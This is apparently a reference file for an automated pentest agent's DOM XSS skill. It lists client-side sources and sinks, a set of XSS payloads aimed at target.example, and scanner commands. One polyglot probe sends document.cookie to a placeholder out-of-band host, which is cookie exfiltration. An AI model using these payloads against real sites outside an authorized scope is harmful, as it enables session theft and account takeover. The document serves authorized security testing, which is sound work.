# payloads — dom-xss-hunter

**Source:** `pentest-agent-development/notebooklm-notes/Guia Completo de Testes e Mitigação de DOM XSS.md` (Section 5: PAYLOADS / PROBES)

DOM-XSS payloads are delivered via URL fragments / `postMessage` /
client-readable state, NOT via server-side reflection. The server may
respond 200 with untouched HTML — the vulnerability is entirely in the
client-side JavaScript.

---

## Step 0 — Identify Sources and Sinks

**Sources** (user-controllable client-side inputs):

```
document.URL
document.documentURI
document.baseURI
document.referrer
document.cookie
location             (.href, .pathname, .search, .hash)
window.name
window.history.state
localStorage / sessionStorage
postMessage events (event.data)
WebSockets (event.data)
```

**Sinks** (execute code or parse HTML):

```
eval(...)
Function(...)
setTimeout("string", ...)
setInterval("string", ...)
document.write(...)
document.writeln(...)
element.innerHTML = ...
element.outerHTML = ...
element.insertAdjacentHTML(..., ...)
element.srcdoc = ...
element.setAttribute("onxxx", ...)
location.href = ... / location.assign(...) / location.replace(...)
element.href = "javascript:..."
```

Grep the loaded JS for source-to-sink flows.

---

## 1. Fragment-Based XSS (most common)

The fragment (`#...`) is NOT sent to the server — purely client-side.
Primary detection target.

```
https://target.example/search#<img src=x onerror=alert(1)>
https://target.example/search#<script>alert(1)</script>
https://target.example/search#javascript:alert(1)
https://target.example/page#foo';alert(1);//
https://target.example/page#"><svg onload=alert(1)>
```

If the page reads `location.hash` and writes it into an `innerHTML` /
`document.write`, the payload executes.

## 2. Query / Path / Hash Source + `innerHTML` Sink

```
https://target.example/?q=<img src=x onerror=alert(1)>
https://target.example/user/<svg onload=alert(1)>
```

Works against sites that read `location.search` or `location.pathname`
and inject unfiltered into the DOM.

## 3. JavaScript String Context Breakout

When the source is inserted into a JS string literal:

```
some_text";alert(1);//
some_text';alert(1);//
some_text\";alert(1);//
some_text\\';alert(1);//
</script><script>alert(1)</script>
```

## 4. Template-String Breakout (Angular / Vue / React context)

If the page uses Angular 1.x or has CSTI via a template engine:

```
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
[[constructor.constructor('alert(1)')()]]       # Vue variant
{{7*7}}                                         # detection; returns 49
```

## 5. `postMessage` Cross-Window XSS

Attacker page sends untrusted messages; a vulnerable listener without
origin check executes.

### Attacker page

```html
<iframe id="t" src="https://target.example/"></iframe>
<script>
const frame = document.getElementById("t").contentWindow;
setTimeout(() => {
  frame.postMessage("<img src=x onerror=alert(1)>", "*");
}, 1500);
</script>
```

### The target is vulnerable if it has:

```javascript
window.addEventListener("message", (e) => {
  document.getElementById("banner").innerHTML = e.data;   // no origin check
});
```

Confirm via `alert` or less-noisy `document.title = "pwn"`.

## 6. `javascript:` URL Sink

When the page assigns `location.href = userInput` or sets an `<a href>`
from a source:

```
javascript:alert(1)
javascript:alert`1`
JaVaScRiPt:alert(1)
```

Chromium blocks `location.href = "javascript:..."` from some contexts
but not `<a href>` — test both.

## 7. `data:` URL Sink

```
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

Useful when the target's client-side code uses a source as the `src` of
a new `<iframe>` / `<object>`.

## 8. SVG-based DOM XSS

When a page allows a user to supply an SVG and renders it inline:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
<svg><script>alert(1)</script></svg>
<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>
```

## 9. PDF / Office Rendering Sink

`pdf.js` / server-rendered viewers can sometimes execute JS in viewer
windows. Craft a PDF that opens on first view:

```
(Fromat this payload outside the skill; PDF/JS is covered minimally
here — delegate to ssrf-cloud-metadata / xxe if needed.)
```

## 10. Browser-Specific Quirks

| Quirk                                                 | Effect                                              |
|-------------------------------------------------------|-----------------------------------------------------|
| `<iframe srcdoc="PAYLOAD">`                           | Treats attribute value as a full HTML document      |
| `document.baseURI` + `<base>` hijack                  | Redirects relative-URL resources                    |
| Missing trailing `</script>`                          | May still execute in IE / legacy renders            |
| `<img src/x=/onerror=alert(1)>`                       | No-quote evasion                                    |

---

## Polyglot / Blind-XSS Probes

```
"-confirm(document.domain)-"
'><svg/onload=fetch('https://OOB/b?c='+document.cookie)>
javascript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=fetch('https://OOB/b'))//
```

---

## Detection Commands

### Static scan for sources / sinks

```bash
# In the repo:
grep -rnE "location\.(hash|search|href|pathname)|document\.URL|document\.referrer" ./src
grep -rnE "\.innerHTML\s*=|document\.write|eval\(|Function\(|setTimeout\([\"'`]" ./src

# Linkfinder / dom-xss-scanner on live JS bundles:
python3 LinkFinder.py -i https://target.example/app.js -o cli
```

### Dynamic — crawl + auto-inject

```bash
# getJS + katana to enumerate all script URLs:
katana -u https://target.example/ -js-crawl -silent > urls.txt

# DOM-based XSS scanner (Blueocean):
dalfox url --deep-domxss -u https://target.example/search?q=FUZZ
```

---

## Detection Signal vs Confirmed

- **Detection** (still needs confirmation): source flows into a sink
  with no visible sanitizer.
- **Confirmed**: a crafted URL opens an `alert` / sets `document.title`
  / fires an OOB callback in a fresh browser session.

---

## Safety Notes

- `alert(1)` is the canonical probe but can be blocked by anti-debug
  code. Use `document.title = "xss-probe"` as a silent alternative.
- `document.cookie` in the payload is exfiltration — replace with
  `document.domain` or `location.href` for evidence; do not log real
  user cookies.
- Blind DOM XSS confirmation requires an OOB domain — register the
  domain in `security-scope.yaml.allowed_oob_domains`.
